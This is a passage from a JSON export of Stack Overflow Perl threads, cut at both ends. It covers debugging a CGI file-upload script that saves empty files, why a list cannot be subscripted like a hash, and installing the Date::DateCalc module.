other diagnostics would have to happen elsewhere, so it seems.</p>\n\n<p>Another (distant?) possibility is that the filehandle pulled from <code>$query</code> has been used to read (or write) and does not any more point to the beginning of the file -- but rather to the end.  This would also not be in the shown code.  <strong>Update:</strong> it may be worth trying <code>seek $query_file, 0, 0</code> before the <code>read</code> loop, to 'rewind` to the beginning of the file.</p>\n\n<p>The code can be improved but I don't see how any of it can cause this problem.</p>\n\n<hr>\n\n<p><strong>Update</strong></p>\n\n<p>The script reads via <code>read($file_query, ...)</code>, where <code>$file_query</code> is set earlier by</p>\n\n<pre><code>$_ = $file_query = $query-&gt;param('file')\n</code></pre>\n\n<p>The <code>query-&gt;param</code> returns names of things, while <a href=\"http://perldoc.perl.org/functions/read.html\" rel=\"nofollow\"><code>read</code></a> needs a filehandle.  By CGI's convenience what is returned by <code>param</code> <em>can</em> be used as a filehandle as well. However, a filehandle is properly obtained from the CGI object by the method <code>$query-&gt;upload('file')</code>.</p>\n\n<p>Then it would be worth trying to get the filehandle via <code>upload</code> method and use that in the <code>read</code> loop, instead of <code>$file_query</code>.  See <a href=\"http://search.cpan.org/~leejo/CGI-4.28/lib/CGI.pod#Processing_a_file_upload_field\" rel=\"nofollow\">File upload</a> section in <a href=\"http://search.cpan.org/~leejo/CGI-4.28/lib/CGI.pod\" rel=\"nofollow\">CGI</a> docs.</p>\n\n<hr>\n\n<p><strong>Update</strong> </p>\n\n<p>From  <a href=\"http://search.cpan.org/~leejo/CGI-4.28/lib/CGI.pod#Processing_a_file_upload_field\" rel=\"nofollow\">File upload</a> in CGI.pm docs</p>\n\n<blockquote>\n  <p>When processing an uploaded file, CGI.pm creates a temporary file on your hard disk and passes you a file handle to that file. </p>\n</blockquote>\n\n<p>Check <em>this</em> file to see whether the file made it to the server at all. Do this before the <code>upload()</code> sub. The linked docs give us</p>\n\n<pre><code>my $fh_tmp  = $query-&gt;upload( 'file' );\nmy $tmpfilename = $query-&gt;tmpFileName( $fh_tmp );\n</code></pre>\n\n<p>Now <code>$tmpfilename</code> can be queried for size, for example by the same <code>stat</code> your code uses to check the <code>$file_name</code> size, or simply using Perl's <a href=\"http://perldoc.perl.org/functions/-X.html\" rel=\"nofollow\">file-test operators</a></p>\n\n<pre><code>(if -z $tmpfilename)  { print \"Empty file (exists but zero size)!\\n\" }\n</code></pre>\n\n<p>If <em>that</em> file is zero-size you know that the problem is earlier. </p>\n"}], "owner": {"reputation": 35, "user_id": 1681502, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/acea32033b417f3eb246063c45c30caa?s=128&d=identicon&r=PG", "display_name": "user1681502", "link": "https://stackoverflow.com/users/1681502/user1681502"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 87, "favorite_count": 1, "accepted_answer_id": 37125406, "answer_count": 1, "score": 0, "last_activity_date": 1462859079, "creation_date": 1462817894, "last_edit_date": 1462824056, "question_id": 37122762, "link": "https://stackoverflow.com/questions/37122762/perl-not-writing-to-buffer", "title": "Perl Not Writing to Buffer", "body": "<p>For many years, I have used the following perl code I downloaded from a site to upload files to our linux server.  Basically, the user types a username and password into an html form, selects the file to upload, and clicks submit.  The script does the rest.  For some reason last week, the script stopped working.  I know it is opening the file to write to because I tried commenting out the 'unlink' line which would remove the file if nothing is written to it.  It does open the file for writing on the server, but when I open the file, there is nothing there.  I've tried changing file permissions and ownership on the directory where the uploaded files are stored without any results.  Any ideas or suggestions?  Thanks!</p>\n\n<pre><code> my $DATA_DIR = '/Absolute/path/to/datadir/';   # Path of data directory\n my $DEFAULT_UPLOAD_DIR = '/tmp/'; #used only if you don't use password.\n\n my $MAX_SIZE_UPLOAD = 25; # Ko\n # File sizes are limited to $MAX_SIZE_UPLOAD (0 No limit), larger files will\n # return an 'Internal Server Error'.\n\n my $FORM_URL = 'http://www.yourdomain.com/upload.html';\n\n my $WEBMASTER_EMAIL = 'you@yourdomain.com';\n\n my $DISPLAY_LANG = 'En'; # Fr -&gt; french\n\n my $USE_PASSWORD_PROTECT = 1; # 1 to use password protect 0 else.\n my $PASSWORD_FILE = $DATA_DIR.'password.txt'; # Name of Password file\n\n # En: Define all messages and buttons text.\n # Fr: Definition des messages et des boutons\n my(%NAME_BUTTON, %NAME_HEADTAB, %NAME_TITLE);\n\n if ($DISPLAY_LANG eq 'Fr') {\n%NAME_BUTTON = ('exit' =&gt; 'Sortir', 'back' =&gt; 'Retour', 'add' =&gt; 'Ok', \n    'add_user' =&gt; 'Ajouter', 'edit_user' =&gt; 'Edit', 'del_user' =&gt; 'Supprimer',  'log' =&gt; 'Entrer');\n %NAME_HEADTAB = ('name' =&gt; 'Nom', 'level' =&gt; 'Droits', 'user_path' =&gt; 'R&amp;eacute;pertoire utilisateur',\n    'login' =&gt; 'Identifiant', 'password' =&gt; 'Mot de passe', 'new_login' =&gt; 'Nouvel identifiant',\n    'new_pass' =&gt; 'Nouveau mot de passe', 'conf_pass' =&gt; 'Confimer mot de passe',\n    'admin' =&gt; 'Administrateur', 'member' =&gt; 'Membre', 'w_path' =&gt; \"(Chemin inexistant !)\");\n%NAME_TITLE   = ('common_admin' =&gt; \"eUpload, &amp;eacute;cran d'administration\", 'common_member' =&gt; 'eUpload, &amp;eacute;cran de chargement',\n    'error_form' =&gt; 'Erreur : Formulaire incomplet', 'manage_users' =&gt; 'Management des utilisateurs', 'edit_user' =&gt; \"Editer 'Value_login' utilisateur\", 'add_user' =&gt; 'Ajout d\\'un utilisateur',\n    'user_saved' =&gt; \"Utilisateur 'Value_login' sav&amp;eacute;\", 'user_added' =&gt; \"Nouvel utilisateur 'Value_login' ajout&amp;eacute;\", 'user_deleted' =&gt; \"Utilisateur 'Value_new_login' supprim&amp;eacute;\",\n    'change_pass' =&gt; 'Changer votre mot de passe', 'chpass_invalid' =&gt; 'Nouveau mot de passe invalide', 'chpass_updated' =&gt; 'Mot de passe de Value_login mis &amp;agrave; jour',\n    'enter_pass' =&gt; 'Entrer votre mot de passe', 'invalid_pass' =&gt; 'MOT de PASSE INCORECT',\n    'EU_BadFN' =&gt; \"Error: Nom de fichier 'Value_FileName' incorrect\", 'EU_FExist' =&gt; \"Error: Fichier 'Value_FileName' existant, impossible de le modifier!\",\n    'EU_Size' =&gt; \"Error: Erreur de chargement de 'Value_FileName'\", 'Upload_Succes' =&gt; 'Chargement r&amp;eacute;ussi !',\n    'Upload_Succes_txt' =&gt; \"'Value_FileName' (Value_Size bytes, Value_Time s) est sauv&amp;eacute;\");\n } else {\n%NAME_BUTTON = ('exit' =&gt; 'Exit', 'back' =&gt; 'Back', 'add' =&gt; 'Ok', \n    'add_user' =&gt; 'Add', 'edit_user' =&gt; 'Edit', 'del_user' =&gt; 'Remove', 'log' =&gt; 'Log in');\n%NAME_HEADTAB = ('name' =&gt; 'Name', 'level' =&gt; 'Level', 'user_path' =&gt; \"User path\",\n    'login' =&gt; 'Login', 'password' =&gt; 'Password', 'new_login' =&gt; 'New Login',\n    'new_pass' =&gt; 'New password', 'conf_pass' =&gt; 'Confim password',\n    'admin' =&gt; 'Administrator', 'member' =&gt; 'Member', 'w_path' =&gt; \"(Path don't exist !)\");\n%NAME_TITLE  = ('common_admin' =&gt; \"eUpload, administrative display\", 'common_member' =&gt; \"eUpload, upload display\",\n    'error_form' =&gt; 'Error : Incomplet form', 'manage_users' =&gt; 'Manage Users', 'edit_user' =&gt; \"Edit 'Value_login' user\", 'add_user' =&gt; 'Add a user',\n    'user_saved' =&gt; \"User 'Value_login' saved\", 'user_added' =&gt; \"New user 'Value_login' added\", 'user_deleted' =&gt; \"User 'Value_new_login' deleted\",\n    'enter_pass' =&gt; 'Enter your password', 'invalid_pass' =&gt; 'INVALID PASSWORD',\n    'EU_BadFN' =&gt; \"Error: Bad Name 'Value_FileName'\", 'EU_FExist' =&gt; \"Error: File 'Value_FileName' exists, can not overwrite !\",\n    'EU_Size' =&gt; \"Error: Could not upload file: 'Value_FileName'\", 'Upload_Succes' =&gt; 'Upload uploaded successfully!',\n    'Upload_Succes_txt' =&gt; \"'Value_FileName' (Value_Size bytes, Value_Time s) was saved\");\n</code></pre>\n\n<p>}</p>\n\n<pre><code> use strict;\n use CGI;\n if ($MAX_SIZE_UPLOAD) { $CGI::POST_MAX=1024 * $MAX_SIZE_UPLOAD; } # Ko\n # File sizes are limited to 25K, larger files will return an 'Internal Server Error'\n\n my $query = new CGI;\n\n my $login    = $query-&gt;param('login');\n my $password = $query-&gt;param('pass');\n my $action   = $query-&gt;param('ac');\n\n my ($dir);\n\n if ($query-&gt;param('BT_Exit')) { $action = ''; }\n\n\n if ($action eq 'admin') {\nprint $query-&gt;header;\nif ($login &amp;&amp; $password)  {\n    &amp;admin($query, $login, $password);\n} else {\n    print &amp;PagePassword($NAME_TITLE{'common_admin'});\n}\n } elsif ($action eq 'upload') {\nprint $query-&gt;header;\nif ($dir = &amp;check_password('guest', $login, $password)) {\n    print &amp;Upload($query, $dir);\n} else {\n    print &amp;BadPassword($NAME_TITLE{'common_member'});\n}\n } else {\nprint $query-&gt;redirect($FORM_URL);\n }\n\n\nsub Upload  {\nmy($query, $upload_dir) = @_;\nmy($file_query, $file_name, $size, $buff, $time, $bytes_count);\n$size = $bytes_count =0;\n$_ = $file_query = $query-&gt;param('file');\ns/\\w://;\ns/([^\\/\\\\]+)$//;\n$_ = $1;\ns/\\.\\.+//g;\ns/\\s+//g;\n$file_name = $_;\n\nif (! $file_name) {\n    $_ = $NAME_TITLE{'EU_BadFN'};\n    s/Value_FileName/$file_name/ig;\n    &amp;Error($_, 1);\n}\n\nif (-e \"$upload_dir/$file_name\") {\n    $_ = $NAME_TITLE{'EU_FExist'};\n    s/Value_FileName/$file_name/ig;\n    &amp;Error($_, 1);\n}\n\nopen(FILE,\"&gt;$upload_dir/$file_name\") || &amp;Error(\"Error opening file      $file_name for writing, error $!\", 1);\nbinmode FILE;\n$time=time();\nwhile ($bytes_count = read($file_query,$buff,2096)) {\n    $size += $bytes_count;\n    print FILE $buff;\n}\nclose(FILE);\n\nif ((stat \"$upload_dir/$file_name\")[7] &lt;= 0) {\n    unlink(\"$upload_dir/$file_name\");\n    $_ = $NAME_TITLE{'EU_Size'};\n    s/Value_FileName/$file_name/ig;\n    &amp;Error($_, 1);\n} else {\n    $time = time -$time;\n    $_ = $NAME_TITLE{'Upload_Succes_txt'};\n    s/Value_FileName/$file_name/ig;\n    s/Value_Size/$size/ig;\n    s/Value_Time/$time/ig;\n    &amp;ResutPage($NAME_TITLE{'Upload_Succes'}, $_);\n }\n }\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 7, "creation_date": 1462812788, "post_id": 37121192, "comment_id": 61783443, "body": "Because that&#39;s not a hash, it&#39;s a list with the following values: <code>&#39;a&#39;, 1, &#39;b&#39;, 2</code>."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 4, "creation_date": 1462813068, "post_id": 37121192, "comment_id": 61783630, "body": "&quot;But since I will refer to it only once, I don&#39;t want to name it.&quot; Why not just do <code>my $x = 1;</code>?"}, {"owner": {"reputation": 4111, "user_id": 23033, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a6b6c69cae4d2061cafe851676f8d262?s=128&d=identicon&r=PG", "display_name": "Dre", "link": "https://stackoverflow.com/users/23033/dre"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 3, "creation_date": 1462813667, "post_id": 37121192, "comment_id": 61783968, "body": "@ThisSuitIsBlackNot I&#39;m assuming this is an <a href=\"http://stackoverflow.com/help/mcve\">MVCE</a> and the contents of the hash (or the key being looked up) is not quite as simple or trivial as shown here."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 4111, "user_id": 23033, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a6b6c69cae4d2061cafe851676f8d262?s=128&d=identicon&r=PG", "display_name": "Dre", "link": "https://stackoverflow.com/users/23033/dre"}, "edited": false, "score": 2, "creation_date": 1462814480, "post_id": 37121192, "comment_id": 61784417, "body": "@Dre That&#39;s exactly why I asked. This seems like an XY problem, but the example gives no hint of what the OP is actually trying to do. The only reason I can think to create a hashref and immediately throw it away is that it has side effects, e.g. one of the values is a tied object, but that would almost certainly be bad design. IMHO, a good answer to this question would explain that <code>my $y = {a=&gt;1, b=&gt;2}-&gt;{a};</code> is bad coding style and would address the OP&#39;s actual problem (assuming the OP explains it)."}, {"owner": {"reputation": 764, "user_id": 66184, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/77Hll.jpg?s=128&g=1", "display_name": "Cary Millsap", "link": "https://stackoverflow.com/users/66184/cary-millsap"}, "edited": false, "score": 1, "creation_date": 1462817616, "post_id": 37121192, "comment_id": 61786152, "body": "The real hash keys are &#39;darwin&#39;, &quot;MSWIn32&quot;, and so on. The real {a} in the problem is actually $^O. So, the assignment is a one-time shot, depending on the OS it&#39;s running on."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462820408, "post_id": 37121192, "comment_id": 61787680, "body": "@CaryMillsap I would edit that into your question, it&#39;s much more interesting than your current version (i.e. solutions are non-trivial). Personally, I would create the hash and do the lookup in two separate statements; <code>$^O</code> only has on the order of 25 distinct values, so you won&#39;t be saving much memory by doing it all in one shot and you&#39;re harming readability."}, {"owner": {"reputation": 764, "user_id": 66184, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/77Hll.jpg?s=128&g=1", "display_name": "Cary Millsap", "link": "https://stackoverflow.com/users/66184/cary-millsap"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1462826353, "post_id": 37121192, "comment_id": 61790840, "body": "@ThisSuitIsBlackNot, thank you for the feedback. I really did mean for the question to be &quot;why is this syntax apparently non-compositional?&quot; as opposed to &quot;what is the best way to assign an OS-dependent value to a string variable?&quot; I was stuck on the notion that (a=&gt;1,b=&gt;2) [which I did already know was equivalent to (a,1,b,2)] should be a perfectly  legitimate way to express a hash, when\u2014out of context\u2014it&#39;s not."}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 3, "creation_date": 1462826619, "post_id": 37121192, "comment_id": 61790974, "body": "To make it compositional, create a hash reference and dereference it. <code>{a =&gt; 1, b =&gt; 2}-&gt;{a}</code> is one way. <code>${{a =&gt; 1, b =&gt; 2}}{b}</code> is another."}, {"owner": {"reputation": 764, "user_id": 66184, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/77Hll.jpg?s=128&g=1", "display_name": "Cary Millsap", "link": "https://stackoverflow.com/users/66184/cary-millsap"}, "reply_to_user": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 1, "creation_date": 1462827783, "post_id": 37121192, "comment_id": 61791649, "body": "@mob: Indeed! Thank you."}], "answers": [{"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 18565, "user_id": 10593, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3eeb7653c4df9b0f1332b9b0ec201ec?s=128&d=identicon&r=PG", "display_name": "Max Lybbert", "link": "https://stackoverflow.com/users/10593/max-lybbert"}, "edited": false, "score": 2, "creation_date": 1462814528, "post_id": 37121615, "comment_id": 61784434, "body": "@MaxLybbert <code>(...)[1]</code> is a <a href=\"http://perldoc.perl.org/perldata.html#Slices\" rel=\"nofollow noreferrer\">list slice</a> and works just fine."}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 1, "creation_date": 1462814546, "post_id": 37121615, "comment_id": 61784447, "body": "<code>perl -wMstrict -E &#39;my $x=(a=&gt;1,b=&gt;2)[1]; say $x&#39;</code> ...prints <code>1</code>"}, {"owner": {"reputation": 18565, "user_id": 10593, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3eeb7653c4df9b0f1332b9b0ec201ec?s=128&d=identicon&r=PG", "display_name": "Max Lybbert", "link": "https://stackoverflow.com/users/10593/max-lybbert"}, "edited": false, "score": 0, "creation_date": 1462815085, "post_id": 37121615, "comment_id": 61784723, "body": "I tested the wrong thing:  <code>perl -Mv5.16 -e &#39;say (1..10)[2]&#39;</code> =&gt; <code>syntax error at -e line 1, near &quot;)[&quot;</code>  But that&#39;s because Perl thinks I&#39;m asking for the third element of the result of calling <code>say(1..10)</code>.  I withdraw the earlier criticism."}, {"owner": {"reputation": 4111, "user_id": 23033, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a6b6c69cae4d2061cafe851676f8d262?s=128&d=identicon&r=PG", "display_name": "Dre", "link": "https://stackoverflow.com/users/23033/dre"}, "reply_to_user": {"reputation": 18565, "user_id": 10593, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3eeb7653c4df9b0f1332b9b0ec201ec?s=128&d=identicon&r=PG", "display_name": "Max Lybbert", "link": "https://stackoverflow.com/users/10593/max-lybbert"}, "edited": false, "score": 1, "creation_date": 1462815255, "post_id": 37121615, "comment_id": 61784802, "body": "@MaxLybbert If you do that with warnings, you get <code>say (...) interpreted as function at -e line 1.</code> --  Adding extraneous parenthesis, your code is being interpreted as <code>( say (1..10) )[2]</code>, if you do <code>perl -Mv5.16 -we &#39;say( (1..10)[2])&#39;</code> it returns as expected"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 18565, "user_id": 10593, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3eeb7653c4df9b0f1332b9b0ec201ec?s=128&d=identicon&r=PG", "display_name": "Max Lybbert", "link": "https://stackoverflow.com/users/10593/max-lybbert"}, "edited": false, "score": 3, "creation_date": 1462815257, "post_id": 37121615, "comment_id": 61784803, "body": "@MaxLybbert That&#39;s because <code>print</code>/<code>say</code> <a href=\"http://perldoc.perl.org/functions/print.html\" rel=\"nofollow noreferrer\">interpret the parentheses as enclosing the arguments</a>: &quot;Be careful not to follow the <code>print</code> keyword with a left parenthesis unless you want the corresponding right parenthesis to terminate the arguments to the print; put parentheses around all arguments (or interpose a <code>+</code>, but that doesn&#39;t look as good).&quot;"}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "reply_to_user": {"reputation": 18565, "user_id": 10593, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3eeb7653c4df9b0f1332b9b0ec201ec?s=128&d=identicon&r=PG", "display_name": "Max Lybbert", "link": "https://stackoverflow.com/users/10593/max-lybbert"}, "edited": false, "score": 1, "creation_date": 1462815260, "post_id": 37121615, "comment_id": 61784806, "body": "@MaxLybbert... nope, add <code>-wMstrict</code> and you&#39;ll get more informative output: <code>say (...) interpreted as function at -e line 1.</code>"}], "tags": [], "owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "is_accepted": false, "score": 5, "last_activity_date": 1462813771, "creation_date": 1462813771, "answer_id": 37121615, "question_id": 37121192, "link": "https://stackoverflow.com/questions/37121192/why-is-a-1-b-2a-a-syntax-error/37121615#37121615", "title": "Why is (a=&gt;1,b=&gt;2){a} a syntax error?", "body": "<p>In <code>my $x = (a=&gt;1, b=&gt;2){a};</code>, that doesn't represent a hash. It's a list with the following values: <code>'a', 1, 'b', 2</code>. The <code>=&gt;</code>, aka fat-comma is simply a glorified comma, with the feature that it quotes the value on the left hand side. It does not implicitly mean that we're dealing with/creating a hash. Example:</p>\n\n<pre><code>my @array = ('a' =&gt; 1 =&gt; 'b' =&gt; 2);\n</code></pre>\n\n<p>To get the value <code>1</code> from the original code shown, you'd have to do <code>my $x = (a=&gt;1, b=&gt;2)[1];</code>.</p>\n\n<p>The hashref method you used: <code>my $y = {a=&gt;1, b=&gt;2}-&gt;{a};</code> is the standard way to use an anonymous hash.</p>\n"}, {"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1462889848, "post_id": 37127030, "comment_id": 61820904, "body": "<code>(foo, bar)</code> does not create list context: in <code>my $foo = (&#39;foo&#39;, &#39;bar&#39;);</code>, both the LHS and RHS are evaluated in scalar context."}, {"owner": {"reputation": 68, "user_id": 6306648, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9e72ce2effeec27f4e80fd24cd607522?s=128&d=identicon&r=PG&f=1", "display_name": "Alex Artukh", "link": "https://stackoverflow.com/users/6306648/alex-artukh"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1463143626, "post_id": 37127030, "comment_id": 61951961, "body": "If you mean &quot;does not create list context for the assigment operation&quot; you are right. The assigment has a scalar context. We just use poped value from &quot;array with no name&quot; to assign <code>&#39;bar&#39;</code> to <code>$foo</code>"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 2, "creation_date": 1463148512, "post_id": 37127030, "comment_id": 61955556, "body": "My point is that this: &#39;It&#39;s just a way to say to interpreter that &quot;we have something in a list context&quot;&#39; is not correct. <code>(foo, bar)</code> does not indicate list context."}], "tags": [], "owner": {"reputation": 68, "user_id": 6306648, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9e72ce2effeec27f4e80fd24cd607522?s=128&d=identicon&r=PG&f=1", "display_name": "Alex Artukh", "link": "https://stackoverflow.com/users/6306648/alex-artukh"}, "is_accepted": true, "score": 3, "last_activity_date": 1462836695, "creation_date": 1462836695, "answer_id": 37127030, "question_id": 37121192, "link": "https://stackoverflow.com/questions/37121192/why-is-a-1-b-2a-a-syntax-error/37127030#37127030", "title": "Why is (a=&gt;1,b=&gt;2){a} a syntax error?", "body": "<p>See, <code>(something1, something2, ...)</code> is not an array constructor. It's just a way to say to interpreter that \"we have something in a list context\". You can understand each <code>(a,b,c,...)</code> usage like an assignment to an array with no name. So, yes we can get a value from this array by index. <code>('a' =&gt; 1, 'b' =&gt; 2)[1]</code> will return <code>1</code>.</p>\n\n<p>Hash will be created only after assignment in list context if left side is a hash variable. Before assignment we can't use this list like hash because we don't have hash. So postcircumfix operation <code>{...}</code> is not allowed. </p>\n"}], "owner": {"reputation": 764, "user_id": 66184, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/77Hll.jpg?s=128&g=1", "display_name": "Cary Millsap", "link": "https://stackoverflow.com/users/66184/cary-millsap"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 135, "favorite_count": 0, "accepted_answer_id": 37127030, "answer_count": 2, "score": 4, "last_activity_date": 1462836695, "creation_date": 1462812400, "last_edit_date": 1462827623, "question_id": 37121192, "link": "https://stackoverflow.com/questions/37121192/why-is-a-1-b-2a-a-syntax-error", "title": "Why is (a=&gt;1,b=&gt;2){a} a syntax error?", "body": "<p>I want to use a hash in an expression. No problem:</p>\n\n<pre><code>use strict;\nuse warnings;\nmy %h = (a=&gt;1, b=&gt;2);\nmy $h = $h{a};\nprint \"h='$h'\\n\";\n</code></pre>\n\n<p>But since I will refer to it only once, I don't want to name it. Naively substituting the hash content for $h doesn't work. The following code produces a syntax error on line 3 at \"){\":</p>\n\n<pre><code>use strict;\nuse warnings;\nmy $x = (a=&gt;1, b=&gt;2){a};\nprint \"x='$x'\\n\";\n</code></pre>\n\n<p>I know that the following is the way to accomplish what I need:</p>\n\n<pre><code>use struct;\nuse warnings;\nmy $y = {a=&gt;1, b=&gt;2}-&gt;{a};\nprint \"y='$y'\\n\";\n</code></pre>\n\n<p>Why doesn't the second example work?</p>\n\n<p>EDIT 1: This is a MVCE. In real life, my hash key ('a' in this example) is not a constant.</p>\n\n<p>EDIT 2: A little more about my motive: I don't want an unnecessary variable in scope in my code, so if I were to restrict the scope of %h to where it really belongs, I would have this:</p>\n\n<pre><code>use strict;\nuse warnings;\nmy $h;\n{\n    my %h = (a=&gt;1, b=&gt;2);\n    $h = $h{a};\n}\nprint \"h='$h'\\n\";\n</code></pre>\n\n<p>I don't want to leave %h in scope for more code than I need, but it's also clunky to write the code segment with the extra block for scoping. This is why I was looking for a clean one-line way to make the assignment.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 2, "creation_date": 1462812041, "post_id": 37121032, "comment_id": 61783037, "body": "<code>pear</code> is for PHP; you want <code>cpan Date::DateCalc</code> (or the equivalent for your system&#39;s package manager)."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462812698, "post_id": 37121032, "comment_id": 61783379, "body": "...although apparently <a href=\"http://www.perlmonks.org/?node_id=612357\" rel=\"nofollow noreferrer\">Date::DateCalc isn&#39;t on CPAN</a>. If your script on the other machine is working, you may have to copy Date/DateCalc.pm over by hand. I&#39;m retracting my duplicate vote, this is a special case."}, {"owner": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462813278, "post_id": 37121032, "comment_id": 61783740, "body": "doh.. sorry... my mistake with pear.. get those confused... so for Perl modules they have to be manually copied?  there is no automated installer for modules?"}, {"owner": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, 